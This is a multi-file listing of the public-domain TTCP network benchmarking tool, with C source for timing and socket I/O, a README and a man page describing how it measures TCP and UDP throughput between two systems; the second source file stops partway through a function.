/******* timing *********/

#ifdef SYSV
extern long time();
static long time0;
static struct tms tms0;
#else
static struct	timeval time0;	/* Time at which timeing started */
static struct	rusage ru0;	/* Resource utilization at the start */

static void prusage();
static void tvadd();
static void tvsub();
static void psecs();
#endif

/*
 *			P R E P _ T I M E R
 */
void
prep_timer()
{
#ifdef SYSV
	(void)time(&time0);
	(void)times(&tms0);
#else
	gettimeofday(&time0, (struct timezone *)0);
	getrusage(RUSAGE_SELF, &ru0);
#endif
}

/*
 *			R E A D _ T I M E R
 * 
 */
double
read_timer(str,len)
char *str;
{
#ifdef SYSV
	long now;
	struct tms tmsnow;
	char line[132];

	(void)time(&now);
	realt = now-time0;
	(void)times(&tmsnow);
	cput = tmsnow.tms_utime - tms0.tms_utime;
	cput /= HZ;
	if( cput < 0.00001 )  cput = 0.01;
	if( realt < 0.00001 )  realt = cput;
	sprintf(line,"%g CPU secs in %g elapsed secs (%g%%)",
		cput, realt,
		cput/realt*100 );
	(void)strncpy( str, line, len );
	return( cput );
#else
	/* BSD */
	struct timeval timedol;
	struct rusage ru1;
	struct timeval td;
	struct timeval tend, tstart;
	char line[132];

	getrusage(RUSAGE_SELF, &ru1);
	gettimeofday(&timedol, (struct timezone *)0);
	prusage(&ru0, &ru1, &timedol, &time0, line);
	(void)strncpy( str, line, len );

	/* Get real time */
	tvsub( &td, &timedol, &time0 );
	realt = td.tv_sec + ((double)td.tv_usec) / 1000000;

	/* Get CPU time (user+sys) */
	tvadd( &tend, &ru1.ru_utime, &ru1.ru_stime );
	tvadd( &tstart, &ru0.ru_utime, &ru0.ru_stime );
	tvsub( &td, &tend, &tstart );
	cput = td.tv_sec + ((double)td.tv_usec) / 1000000;
	if( cput < 0.00001 )  cput = 0.00001;
	return( cput );
#endif
}

#ifndef SYSV
static void
prusage(r0, r1, e, b, outp)
	register struct rusage *r0, *r1;
	struct timeval *e, *b;
	char *outp;
{
	struct timeval tdiff;
	register time_t t;
	register char *cp;
	register int i;
	int ms;

	t = (r1->ru_utime.tv_sec-r0->ru_utime.tv_sec)*100+
	    (r1->ru_utime.tv_usec-r0->ru_utime.tv_usec)/10000+
	    (r1->ru_stime.tv_sec-r0->ru_stime.tv_sec)*100+
	    (r1->ru_stime.tv_usec-r0->ru_stime.tv_usec)/10000;
	ms =  (e->tv_sec-b->tv_sec)*100 + (e->tv_usec-b->tv_usec)/10000;

#define END(x)	{while(*x) x++;}
	cp = "%Uuser %Ssys %Ereal %P %Xi+%Dd %Mmaxrss %F+%Rpf %Ccsw";
	for (; *cp; cp++)  {
		if (*cp != '%')
			*outp++ = *cp;
		else if (cp[1]) switch(*++cp) {

		case 'U':
			tvsub(&tdiff, &r1->ru_utime, &r0->ru_utime);
			sprintf(outp,"%d.%01d", tdiff.tv_sec, tdiff.tv_usec/100000);
			END(outp);
			break;

		case 'S':
			tvsub(&tdiff, &r1->ru_stime, &r0->ru_stime);
			sprintf(outp,"%d.%01d", tdiff.tv_sec, tdiff.tv_usec/100000);
			END(outp);
			break;

		case 'E':
			psecs(ms / 100, outp);
			END(outp);
			break;

		case 'P':
			sprintf(outp,"%d%%", (int) (t*100 / ((ms ? ms : 1))));
			END(outp);
			break;

		case 'W':
			i = r1->ru_nswap - r0->ru_nswap;
			sprintf(outp,"%d", i);
			END(outp);
			break;

		case 'X':
			sprintf(outp,"%d", t == 0 ? 0 : (r1->ru_ixrss-r0->ru_ixrss)/t);
			END(outp);
			break;

		case 'D':
			sprintf(outp,"%d", t == 0 ? 0 :
			    (r1->ru_idrss+r1->ru_isrss-(r0->ru_idrss+r0->ru_isrss))/t);
			END(outp);
			break;

		case 'K':
			sprintf(outp,"%d", t == 0 ? 0 :
			    ((r1->ru_ixrss+r1->ru_isrss+r1->ru_idrss) -
			    (r0->ru_ixrss+r0->ru_idrss+r0->ru_isrss))/t);
			END(outp);
			break;

		case 'M':
			sprintf(outp,"%d", r1->ru_maxrss/2);
			END(outp);
			break;

		case 'F':
			sprintf(outp,"%d", r1->ru_majflt-r0->ru_majflt);
			END(outp);
			break;

		case 'R':
			sprintf(outp,"%d", r1->ru_minflt-r0->ru_minflt);
			END(outp);
			break;

		case 'I':
			sprintf(outp,"%d", r1->ru_inblock-r0->ru_inblock);
			END(outp);
			break;

		case 'O':
			sprintf(outp,"%d", r1->ru_oublock-r0->ru_oublock);
			END(outp);
			break;
		case 'C':
			sprintf(outp,"%d+%d", r1->ru_nvcsw-r0->ru_nvcsw,
				r1->ru_nivcsw-r0->ru_nivcsw );
			END(outp);
			break;
		}
	}
	*outp = '\0';
}

static void
tvadd(tsum, t0, t1)
	struct timeval *tsum, *t0, *t1;
{

	tsum->tv_sec = t0->tv_sec + t1->tv_sec;
	tsum->tv_usec = t0->tv_usec + t1->tv_usec;
	if (tsum->tv_usec > 1000000)
		tsum->tv_sec++, tsum->tv_usec -= 1000000;
}

static void
tvsub(tdiff, t1, t0)
	struct timeval *tdiff, *t1, *t0;
{

	tdiff->tv_sec = t1->tv_sec - t0->tv_sec;
	tdiff->tv_usec = t1->tv_usec - t0->tv_usec;
	if (tdiff->tv_usec < 0)
		tdiff->tv_sec--, tdiff->tv_usec += 1000000;
}

static void
psecs(l,cp)
long l;
register char *cp;
{
	register int i;

	i = l / 3600;
	if (i) {
		sprintf(cp,"%d:", i);
		END(cp);
		i = l % 3600;
		sprintf(cp,"%d%d", (i/60) / 10, (i/60) % 10);
		END(cp);
	} else {
		i = l;
		sprintf(cp,"%d", i / 60);
		END(cp);
	}
	i %= 60;
	*cp++ = ':';
	sprintf(cp,"%d%d", i / 10, i % 10);
}
#endif

/*
 *			N R E A D
 */
Nread( fd, buf, count )
{
	struct sockaddr_in from;
	int len = sizeof(from);
	register int cnt;
	if( udp )  {
		cnt = recvfrom( fd, buf, count, 0, &from, &len );
	} else {
		if( b_flag )
			cnt = mread( fd, buf, count );	/* fill buf */
		else
			cnt = read( fd, buf, count );
	}
	return(cnt);
}

/*
 *			N W R I T E
 */
Nwrite( fd, buf, count )
{
	register int cnt;
	if( udp )  {
again:
		cnt = sendto( fd, buf, count, 0, &sinhim, sizeof(sinhim) );
		if( cnt<0 && errno == ENOBUFS )  {
			delay(18000);
			errno = 0;
			goto again;
		}
	} else {
		cnt = write( fd, buf, count );
	}
	return(cnt);
}

delay(us)
{
	struct timeval tv;

	tv.tv_sec = 0;
	tv.tv_usec = us;
	(void)select( 1, (char *)0, (char *)0, (char *)0, &tv );
	return(1);
}

/*
 *			M R E A D
 *
 * This function performs the function of a read(II) but will
 * call read(II) multiple times in order to get the requested
 * number of characters.  This can be necessary because
 * network connections don't deliver data with the same
 * grouping as it is written with.  Written by Robert S. Miles, BRL.
 */
int
mread(fd, bufp, n)
int fd;
register char	*bufp;
unsigned	n;
{
	register unsigned	count = 0;
	register int		nread;

	do {
		nread = read(fd, bufp, n-count);
		if(nread < 0)  {
			perror("ttcp_mread");
			return(-1);
		}
		if(nread == 0)
			return((int)count);
		count += (unsigned)nread;
		bufp += nread;
	 } while(count < n);

	return((int)count);
}
::::::::::::::
ttcp2-README
::::::::::::::
TTCP is a benchmarking tool for determining TCP and UDP performance 
between 2 systems.

The program was created at the US Army Ballistics Research Lab (BRL)
and is in the public domain. Feel free to distribute this program
but please do leave the credit notices in the source and man page intact.

Contents of this directory:

ttcp.c		Source that runs on IRIX 3.3.x and 4.0.x systems
		and BSD-based systems.  This version also uses getopt(3) 
		and has 2 new options: -f and -T.

ttcp.c-brl	Original source from BRL.

ttcp.1		Manual page (describes ttcp.c options, which are a 
		superset of the other version).


How to get TCP performance numbers:

	receiver				sender

host1%  ttcp -r -s			host2% ttcp -t -s host1

-n and -l options change the number and size of the buffers.
::::::::::::::
ttcp2.1
::::::::::::::
'\"macro stdmacro
.TH TTCP 1 local
.SH NAME
ttcp \- test TCP and UDP performance
.SH SYNOPSIS
.B ttcp \-t
.RB [ \-u ]
.RB [ \-s ]
.RB [ \-p\0 \fIport\fP ]
.RB [ \-l\0 \fIbuflen\fP ]
.RB [ \-b\0 \fIsize\fP ]
.RB [ \-n\0 \fInumbufs\fP ]
.RB [ \-A\0 \fIalign\fP ]
.RB [ \-O\0 \fIoffset\fP ]
.RB [ \-f\0 \fIformat\fP ]
.RB [ \-D ]
.RB [ \-v]
.RB host
.RB [ < in ]
.br
.B ttcp \-r
.RB [ \-u ]
.RB [ \-s ]
.RB [ \-p\0 \fIport\fP ]
.RB [ \-l\0 \fIbuflen\fP ]
.RB [ \-b\0 \fIsize\fP ]
.RB [ \-A\0 \fIalign\fP ]
.RB [ \-O\0 \fIoffset\fP ]
.RB [ \-f\0 \fIformat\fP ]
.RB [ \-B ]
.RB [ \-T ]
.RB [ \-v ]
.RB [ > out ]
.SH DESCRIPTION
.I Ttcp
times the transmission and reception of data between two systems using 
the UDP or TCP protocols.
It differs from common ``blast'' tests, which tend to measure the remote
.I inetd
as much as the network performance, and which usually do not allow 
measurements at the remote end of a UDP transmission.
.PP
For testing, the transmitter should be started with \f3\-t\f1 and \f3\-s\f1
after the receiver has been started with \f3\-r\f1 and \f3\-s\f1.
Tests lasting at least tens of seconds should be used to obtain accurate
measurements.
Graphical presentations of throughput versus buffer size for
buffers ranging from tens of bytes to several ``pages'' can illuminate
bottlenecks.
.PP
.I Ttcp
can also be used as a ``network pipe'' for moving directory hierarchies
between systems when routing problems exist or when the use of other
mechanisms is undesirable. For example, on the destination machine, use:
.Ex
ttcp \-r \-B | tar xvpf \-
.Ee
.PP
and on the source machine:
.Ex
tar cf \- directory | ttcp \-t dest_machine
.Ee
.PP
Additional intermediate machines can be included by:
.Ex
ttcp \-r | ttcp \-t next_machine
.Ee
.SH OPTIONS
.TP 10
\-t
Transmit mode.
.TP 10
\-r
Receive mode.
.TP 10
\-u
Use UDP instead of TCP.
.TP 10
\-s
If transmitting, source a data pattern to network;
if receiving, sink (discard) the data.
Without the \f3\-s\f1 option, the default is to transmit data from
.I stdin
or print the received data to
.IR stdout .
.TP 10
\-l \fIlength\fP
Length of buffers in bytes (default 8192).
For UDP, this value is the number of data bytes in each packet.
The system limits the maximum UDP packet length. This limit can be 
changed with the \f3\-b\f1 option.
.TP 10
\-b \fIsize\fP
Set size of socket buffer.  The default varies from system to system.
This parameter affects the maximum UDP packet length.
It may not be possible to set this parameter on some systems
(for example, 4.2BSD).
.TP 10
\-n \fInumbufs\fP
Number of source buffers transmitted (default 2048).
.TP 10
\-p \fIport\fP
Port number to send to or listen on (default 2000).
On some systems, this port may be allocated to another network daemon.
.TP 10
\-D
If transmitting using TCP, do not buffer data when sending
(sets the TCP_NODELAY socket option).
It may not be possible to set this parameter on some systems
(for example, 4.2BSD).
.TP 10
\-B
When receiving data, output only full blocks, 
using the block size specified by \f3\-l\f1.
This option is useful for programs, such as \f2tar\f1(1), that require
complete blocks.
.TP 10
\-A \fIalign\fP
Align the start of buffers to this modulus (default 16384).
.TP 10
\-O \fIoffset\fP
Align the start of buffers to this offset (default 0).
For example, ``\-A8192 \-O1'' causes buffers to start at the second byte
of an 8192-byte page.
.TP 10
\-f \fIformat\fP
Specify, using one of the following characters, 
the format of the throughput rates as 
kilobits/sec ('k'), kilobytes/sec ('K'), 
megabits/sec ('m'), megabytes/sec ('M'), 
gigabits/sec ('g'), or gigabytes/sec ('G').
The default is 'K'.
.TP 10
\-T
``Touch'' the data as they are read in order to measure cache effects.
.TP 10
\-v
Verbose: print more statistics.
.TP 10
\-d
Debug: set the SO_DEBUG socket option.
.SH SEE ALSO
ping(1M), traceroute(1M), netsnoop(1M)
::::::::::::::
ttcp2.c
::::::::::::::
/*
 *	T T C P . C
 *
 * Test TCP connection.  Makes a connection on port 5001
 * and transfers fabricated buffers or data copied from stdin.
 *
 * Usable on 4.2, 4.3, and 4.1a systems by defining one of
 * BSD42 BSD43 (BSD41a)
 * Machines using System V with BSD sockets should define SYSV.
 *
 * Modified for operation under 4.2BSD, 18 Dec 84
 *      T.C. Slattery, USNA
 * Minor improvements, Mike Muuss and Terry Slattery, 16-Oct-85.
 * Modified in 1989 at Silicon Graphics, Inc.
 *	catch SIGPIPE to be able to print stats when receiver has died 
 *	for tcp, don't look for sentinel during reads to allow small transfers
 *	increased default buffer size to 8K, nbuf to 2K to transfer 16MB
 *	moved default port to 5001, beyond IPPORT_USERRESERVED
 *	make sinkmode default because it is more popular, 
 *		-s now means don't sink/source 
 *	count number of read/write system calls to see effects of 
 *		blocking from full socket buffers
 *	for tcp, -D option turns off buffered writes (sets TCP_NODELAY sockopt)
 *	buffer alignment options, -A and -O
 *	print stats in a format that's a bit easier to use with grep & awk
 *	for SYSV, mimic BSD routines to use most of the existing timing code
 * Modified by Steve Miller of the University of Maryland, College Park
 *	-b sets the socket buffer size (SO_SNDBUF/SO_RCVBUF)
 * Modified Sept. 1989 at Silicon Graphics, Inc.
 *	restored -s sense at request of tcs@brl
 * Modified Oct. 1991 at Silicon Graphics, Inc.
 *	use getopt(3) for option processing, add -f and -T options.
 *	SGI IRIX 3.3 and 4.0 releases don't need #define SYSV.
 *
 * Distribution Status -
 *      Public Domain.  Distribution Unlimited.
 */
#ifndef lint
static char RCSid[] = "ttcp.c $Revision: 1.12 $";
#endif

#define BSD43
/* #define BSD42 */
/* #define BSD41a */
/* #define SYSV */	/* required on SGI IRIX releases before 3.3 */

#include <stdio.h>
#include <signal.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>		/* struct timeval */

#if defined(SYSV)
#include <sys/times.h>
#include <sys/param.h>
struct rusage {
    struct timeval ru_utime, ru_stime;
};
#define RUSAGE_SELF 0
#else
#include <sys/resource.h>
#endif

struct sockaddr_in sinme;
struct sockaddr_in sinhim;
struct sockaddr_in frominet;

int domain, fromlen;
int fd;				/* fd of network socket */

int buflen = 8 * 1024;		/* length of buffer */
char *buf;			/* ptr to dynamic buffer */
int nbuf = 2 * 1024;		/* number of buffers to send in sinkmode */

int bufoffset = 0;		/* align buffer to this */
int bufalign = 16*1024;		/* modulo this */

int udp = 0;			/* 0 = tcp, !0 = udp */
int options = 0;		/* socket options */
int one = 1;                    /* for 4.3 BSD style setsockopt() */
short port = 5001;		/* TCP port number */
char *host;			/* ptr to name of host */
int trans;			/* 0=receive, !0=transmit mode */
int sinkmode = 0;		/* 0=normal I/O, !0=sink/source mode */
int verbose = 0;		/* 0=print basic info, 1=print cpu rate, proc
				 * resource usage. */
int nodelay = 0;		/* set TCP_NODELAY socket option */
int b_flag = 0;			/* use mread() */
int sockbufsize = 0;		/* socket buffer size to use */
char fmt = 'K';			/* output format: k = kilobits, K = kilobytes,
				 *  m = megabits, M = megabytes, 
				 *  g = gigabits, G = gigabytes */
int touchdata = 0;		/* access data after reading */

struct hostent *addr;
extern int errno;
extern int optind;
extern char *optarg;

char Usage[] = "\
Usage: ttcp -t [-options] host [ < in ]\n\
       ttcp -r [-options > out]\n\
Common options:\n\
	-l ##	length of bufs read from or written to network (default 8192)\n\
	-u	use UDP instead of TCP\n\
	-p ##	port number to send to or listen at (default 5001)\n\
	-s	-t: source a pattern to network\n\
		-r: sink (discard) all data from network\n\
	-A	align the start of buffers to this modulus (default 16384)\n\
	-O	start buffers at this offset from the modulus (default 0)\n\
	-v	verbose: print more statistics\n\
	-d	set SO_DEBUG socket option\n\
	-b ##	set socket buffer size (if supported)\n\
	-f X	format for rate: k,K = kilo{bit,byte}; m,M = mega; g,G = giga\n\
Options specific to -t:\n\
	-n##	number of source bufs written to network (default 2048)\n\
	-D	don't buffer TCP writes (sets TCP_NODELAY socket option)\n\
Options specific to -r:\n\
	-B	for -s, only output full blocks as specified by -l (for TAR)\n\
	-T	\"touch\": access each byte as it's read\n\
";	

char stats[128];
double nbytes;			/* bytes on net */
unsigned long numCalls;		/* # of I/O system calls */
double cput, realt;		/* user, real time (seconds) */

void err();
void mes();
int pattern();
void prep_timer();
double read_timer();
int Nread();
int Nwrite();
void delay();
int mread();
char *outfmt();

void
sigpipe()
{
}

main(argc,argv)
int argc;
char **argv;
{
	unsigned long addr_tmp;
	int c;

	if (argc < 2) goto usage;

	while ((c = getopt(argc, argv, "drstuvBDTb:f:l:n:p:A:O:")) != -1) {
		switch (c) {

		case 'B':
			b_flag = 1;
			break;
		case 't':
			trans = 1;
			break;
		case 'r':
			trans = 0;
			break;
		case 'd':
			options |= SO_DEBUG;
			break;
		case 'D':
#ifdef TCP_NODELAY
			nodelay = 1;
#else
			fprintf(stderr, 
	"ttcp: -D option ignored: TCP_NODELAY socket option not supported\n");
#endif
			break;
		case 'n':
			nbuf = atoi(optarg);
			break;
		case 'l':
			buflen = atoi(optarg);
			break;
		case 's':
			sinkmode = !sinkmode;
			break;
		case 'p':
			port = atoi(optarg);
			break;
		case 'u':
			udp = 1;
			break;
		case 'v':
			verbose = 1;
			break;
		case 'A':
			bufalign = atoi(optarg);
			break;
		case 'O':
			bufoffset = atoi(optarg);
			break;
		case 'b':
#if defined(SO_SNDBUF) || defined(SO_RCVBUF)
			sockbufsize = atoi(optarg);
#else
			fprintf(stderr, 
"ttcp: -b option ignored: SO_SNDBUF/SO_RCVBUF socket options not supported\n");
#endif
			break;
		case 'f':
			fmt = *optarg;
			break;
		case 'T':
			touchdata = 1;
			break;

		default:
			goto usage;
		}
	}
	if(trans)  {
		/* xmitr */
		if (optind == argc)
			goto usage;
		bzero((char *)&sinhim, sizeof(sinhim));
		host = argv[optind];
		if (atoi(host) > 0 )  {
			/* Numeric */
			sinhim.sin_family = AF_INET;
#if defined(cray)
			addr_tmp = inet_addr(host);
			sinhim.sin_addr = addr_tmp;
#else
			sinhim.sin_addr.s_addr = inet_addr(host);
#endif
		} else {
			if ((addr=gethostbyname(host)) == NULL)
				err("bad hostname");
			sinhim.sin_family = addr->h_addrtype;
			bcopy(addr->h_addr,(char*)&addr_tmp, addr->h_length);
#if defined(cray)
			sinhim.sin_addr = addr_tmp;
#else
			sinhim.sin_addr.s_addr = addr_tmp;
#endif /* cray */
		}
		sinhim.sin_port = htons(port);
		sinme.sin_port = 0;		/* free choice */
	} else {
		/* rcvr */
		sinme.sin_port =  htons(port);
	}


	if (udp && buflen < 5) {
	    buflen = 5;		/* send more than the sentinel size */
	}

	if ( (buf = (char *)malloc(buflen+bufalign)) == (char *)NULL)
		err("malloc");
	if (bufalign != 0)
		buf +=(bufalign - ((int)buf % bufalign) + bufoffset) % bufalign;

	if (trans) {
	    fprintf(stdout,
	    "ttcp-t: buflen=%d, nbuf=%d, align=%d/%d, port=%d",
		buflen, nbuf, bufalign, bufoffset, port);
 	    if (sockbufsize)
 		fprintf(stdout, ", sockbufsize=%d", sockbufsize);
 	    fprintf(stdout, "  %s  -> %s\n", udp?"udp":"tcp", host);
	} else {
	    fprintf(stdout,
 	    "ttcp-r: buflen=%d, nbuf=%d, align=%d/%d, port=%d",
 		buflen, nbuf, bufalign, bufoffset, port);
 	    if (sockbufsize)
 		fprintf(stdout, ", sockbufsize=%d", sockbufsize);
 	    fprintf(stdout, "  %s\n", udp?"udp":"tcp");
	}

	if ((fd = socket(AF_INET, udp?SOCK_DGRAM:SOCK_STREAM, 0)) < 0)
		err("socket");
	mes("socket");

	if (bind(fd, &sinme, sizeof(sinme)) < 0)
		err("bind");

#if defined(SO_SNDBUF) || defined(SO_RCVBUF)
	if (sockbufsize) {
	    if (trans) {
		if (setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sockbufsize,
		    sizeof sockbufsize) < 0)
			err("setsockopt: sndbuf");
		mes("sndbuf");
	    } else {
		if (setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &sockbufsize,
		    sizeof sockbufsize) < 0)
			err("setsockopt: rcvbuf");
		mes("rcvbuf");
	    }
	}
#endif

	if (!udp)  {
	    signal(SIGPIPE, sigpipe);
	    if (trans) {
		/* We are the client if transmitting */
		if (options)  {
#if defined(BSD42)
			if( setsockopt(fd, SOL_SOCKET, options, 0, 0) < 0)
#else /* BSD43 */
			if( setsockopt(fd, SOL_SOCKET, options, &one, sizeof(one)) < 0)
#endif
				err("setsockopt");
		}
#ifdef TCP_NODELAY
		if (nodelay) {
			struct protoent *p;
			p = getprotobyname("tcp");
			if( p && setsockopt(fd, p->p_proto, TCP_NODELAY, 
			    &one, sizeof(one)) < 0)
				err("setsockopt: nodelay");
			mes("nodelay");
		}
#endif
		if(connect(fd, &sinhim, sizeof(sinhim) ) < 0)
			err("connect");
		mes("connect");
	    } else {
		/* otherwise, we are the server and 
	         * should listen for the connections
	         */
#if defined(ultrix) || defined(sgi)
		listen(fd,1);   /* workaround for alleged u4.2 bug */
#else
		listen(fd,0);   /* allow a queue of 0 */
#endif
		if(options)  {
#if defined(BSD42)
			if( setsockopt(fd, SOL_SOCKET, options, 0, 0) < 0)
#else /* BSD43 */
			if( setsockopt(fd, SOL_SOCKET, options, &one, sizeof(one)) < 0)
#endif
				err("setsockopt");
		}
		fromlen = sizeof(frominet);
		domain = AF_INET;
		if((fd=accept(fd, &frominet, &fromlen) ) < 0)
			err("accept");
		{ struct sockaddr_in peer;
		  int peerlen = sizeof(peer);
		  if (getpeername(fd, (struct sockaddr_in *) &peer, 
				&peerlen) < 0) {
			err("getpeername");
		  }
		  fprintf(stderr,"ttcp-r: accept from %s\n", 
			inet_ntoa(peer.sin_addr));
		}
	    }
	}
	prep_timer();
	errno = 0;
	if (sinkmode) {      
		register int cnt;
		if (trans)  {
			pattern( buf, buflen );
			if(udp)  (void)Nwrite( fd, buf, 4 ); /* rcvr start */
			while (nbuf-- && Nwrite(fd,buf,buflen) == buflen)
				nbytes += buflen;
			if(udp)  (void)Nwrite( fd, buf, 4 ); /* rcvr end */
		} else {
			if (udp) {
			    while ((cnt=Nread(fd,buf,buflen)) > 0)  {
				    static int going = 0;
				    if( cnt <= 4 )  {
					    if( going )
						    break;	/* "EOF" */
					    going = 1;
					    prep_timer();
				    } else {
					    nbytes += cnt;
				    }
			    }
			} else {
			    while ((cnt=Nread(fd,buf,buflen)) > 0)  {
				    nbytes += cnt;
			    }
			}
		}
	} else {
		register int cnt;
		if (trans)  {
			while((cnt=read(0,buf,buflen)) > 0 &&
			    Nwrite(fd,buf,cnt) == cnt)
				nbytes += cnt;
		}  else  {
			while((cnt=Nread(fd,buf,buflen)) > 0 &&
			    write(1,buf,cnt) == cnt)
				nbytes += cnt;
		}
	}
	if(errno) err("IO");
	(void)read_timer(stats,sizeof(stats));
	if(udp&&trans)  {
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
	}
	if( cput <= 0.0 )  cput = 0.001;
	if( realt <= 0.0 )  realt = 0.001;
	fprintf(stdout,
		"ttcp%s: %.0f bytes in %.2f real seconds = %s/sec +++\n",
		trans?"-t":"-r",
		nbytes, realt, outfmt(nbytes/realt));
	if (verbose) {
	    fprintf(stdout,
		"ttcp%s: %.0f bytes in %.2f CPU seconds = %s/cpu sec\n",
		trans?"-t":"-r",
		nbytes, cput, outfmt(nbytes/cput));
	}
	fprintf(stdout,
		"ttcp%s: %d I/O calls, msec/call = %.2f, calls/sec = %.2f\n",
		trans?"-t":"-r",
		numCalls,
		1024.0 * realt/((double)numCalls),
		((double)numCalls)/realt);
	fprintf(stdout,"ttcp%s: %s\n", trans?"-t":"-r", stats);
	if (verbose) {
	    fprintf(stdout,
		"ttcp%s: buffer address %#x\n",
		trans?"-t":"-r",
		buf);
	}
	exit(0);

usage:
	fprintf(stderr,Usage);
	exit(1);
}

void
err(s)
char *s;
{
	fprintf(stderr,"ttcp%s: ", trans?"-t":"-r");
	perror(s);
	fprintf(stderr,"errno=%d\n",errno);
	exit(1);
}

void
mes(s)
char *s;
{
	fprintf(stderr,"ttcp%s: %s\n", trans?"-t":"-r", s);
}

pattern( cp, cnt )
register char *cp;
register int cnt;
{
	register char c;
	c = 0;
	while( cnt-- > 0 )  {
		while( !isprint((c&0x7F)) )  c++;
		*cp++ = (c++&0x7F);
	}
}

char *
outfmt(b)
double b;
{
    static char obuf[50];
    switch (fmt) {
	case 'G':
	    sprintf(obuf, "%.2f GB", b / 1024.0 / 1024.0 / 1024.0);
	    break;
	default:
	case 'K':
	    sprintf(obuf, "%.2f KB", b / 1024.0);
	    break;
	case 'M':
	    sprintf(obuf, "%.2f MB", b / 1024.0 / 1024.0);
	    break;
	case 'g':
	    sprintf(obuf, "%.2f Gbit", b * 8.0 / 1024.0 / 1024.0 / 1024.0);
	    break;
	case 'k':
	    sprintf(obuf, "%.2f Kbit", b * 8.0 / 1024.0);
	    break;
	case 'm':
	    sprintf(obuf, "%.2f Mbit", b * 8.0 / 1024.0 / 1024.0);
	    break;
    }
    return obuf;
}

static struct	timeval time0;	/* Time at which timing started */
static struct	rusage ru0;	/* Resource utilization at the start */

static void prusage();
static void tvadd();
static void tvsub();
static void psecs();

#if defined(SYSV)
/*ARGSUSED*/
static
getrusage(ignored, ru)
    int ignored;
    register struct rusage *ru;
{
    struct tms buf;

    times(&buf);

    /* Assumption: HZ <= 2147 (LONG_MAX/1000000) */
    ru->ru_stime.tv_sec  = buf.tms_stime / HZ;
    ru->ru_stime.tv_usec = ((buf.tms_stime % HZ) * 1000000) / HZ;
    ru->ru_utime.tv_sec  = buf.tms_utime / HZ;
    ru->ru_utime.tv_usec = ((buf.tms_utime % HZ) * 1000000) / HZ;
}

/*ARGSUSED*/
static 
gettimeofday(tp, zp)
    struct timeval *tp;
    struct timezone *zp;
{
    tp->tv_sec = time(0);
    tp->tv_usec = 0;
}
#endif /* SYSV */

/*
 *			P R E P _ T I M E R
 */
void
prep_timer()
{
	gettimeofday(&time0, (struct timezone *)0);
	getrusage(RUSAGE_SELF, &ru0);
}

/*
 *			R E A D _ T I M E R
 * 
 */
double
read_timer(str,len)
char *str;
{
	struct timeval timedol;
	struct rusage ru1;
	struct timeval td;
	struct timeval tend, tstart;
	char line[132];

	getrusage(RUSAGE_SELF, &ru1);
	gettimeofday(&timedol, (struct timezone *)0);
	prusage(&ru0, &ru1, &timedol, &time0, line);
	(void)strncpy( str, line, len );

	/* Get real time */
	tvsub( &td, &timedol, &time0 );
	realt = td.tv_sec + ((double)td.tv_usec) / 1000000;

	/* Get CPU time (user+sys) */
	tvadd( &tend, &ru1.ru_utime, &ru1.ru_stime );
	tvadd( &tstart, &ru0.ru_utime, &ru0.ru_stime );
	tvsub( &td, &tend, &tstart );
	cput = td.tv_sec + ((double)td.tv_usec) / 1000000;
	if( cput < 0.00001 )  cput = 0.00001;
	return( cput );
}

static void
prusage(r0, r1, e, b, outp)
	register struct rusage *r0, *r1;
	struct timeval *e, *b;
	char *outp;
{
	struct timeval tdiff;
	register time_t t;
	register char *cp;
	register int i;
	int ms;

	t = (r1->ru_utime.tv_sec-r0->ru_utime.tv_sec)*100+
	    (r1->ru_utime.tv_usec-r0->ru_utime.tv_usec)/10000+
	    (r1->ru_stime.tv_sec-r0->ru_stime.tv_sec)*100+
	    (r1->ru_stime.tv_usec-r0->ru_stime.tv_usec)/10000;
	ms =  (e->tv_sec-b->tv_sec)*100 + (e->tv_usec-b->tv_usec)/10000;

#define END(x)	{while(*x) x++;}
#if defined(SYSV)
	cp = "%Uuser %Ssys %Ereal %P";
#else
#if defined(sgi)		/* IRIX 3.3 will show 0 for %M,%F,%R,%C */
	cp = "%Uuser %Ssys %Ereal %P %Mmaxrss %F+%Rpf %Ccsw";
#else
	cp = "%Uuser %Ssys %Ereal %P %Xi+%Dd %Mmaxrss %F+%Rpf %Ccsw";
#endif
#endif
	for (; *cp; cp++)  {
		if (*cp != '%')
			*outp++ = *cp;
		else if (cp[1]) switch(*++cp) {

		case 'U':
			tvsub(&tdiff, &r1->ru_utime, &r0->ru_utime);
			sprintf(outp,"%d.%01d", tdiff.tv_sec, tdiff.tv_usec/100000);
			END(outp);
			break;

		case 'S':
			tvsub(&tdiff, &r1->ru_stime, &r0->ru_stime);
			sprintf(outp,"%d.%01d", tdiff.tv_sec, tdiff.tv_usec/100000);
			END(outp);
			break;

		case 'E':
			psecs(ms / 100, outp);
			END(outp);
			break;

		case 'P':
			sprintf(outp,"%d%%", (int) (t*100 / ((ms ? ms : 1))));
			END(outp);
			break;

#if !defined(SYSV)
		case 'W':
			i = r1->ru_nswap - r0->ru_nswap;
			sprintf(outp,"%d", i);
			END(outp);
			break;

		case 'X':
			sprintf(outp,"%d", t == 0 ? 0 : (r1->ru_ixrss-r0->ru_ixrss)/t);
			END(outp);
			break;

		case 'D':
			sprintf(outp,"%d", t == 0 ? 0 :
			    (r1->ru_idrss+r1->ru_isrss-(r0->ru_idrss+r0->ru_isrss))/t);
			END(outp);
			break;

		case 'K':
			sprintf(outp,"%d", t == 0 ? 0 :
			    ((r1->ru_ixrss+r1->ru_isrss+r1->ru_idrss) -
			    (r0->ru_ixrss+r0->ru_idrss+r0->ru_isrss))/t);
			END(outp);
			break;

		case 'M':
			sprintf(outp,"%d", r1->ru_maxrss/2);
			END(outp);
			break;

		case 'F':
			sprintf(outp,"%d", r1->ru_majflt-r0->ru_majflt);
			END(outp);
			break;

		case 'R':
			sprintf(outp,"%d", r1->ru_minflt-r0->ru_minflt);
			END(outp);
			break;

		case 'I':
			sprintf(outp,"%d", r1->ru_inblock-r0->ru_inblock);
			END(outp);
			break;

		case 'O':
			sprintf(outp,"%d", r1->ru_oublock-r0->ru_oublock);
			END(outp);
			break;
		case 'C':
			sprintf(outp,"%d+%d", r1->ru_nvcsw-r0->ru_nvcsw,
				r1->ru_nivcsw-r0->ru_nivcsw );
			END(outp);
			break;
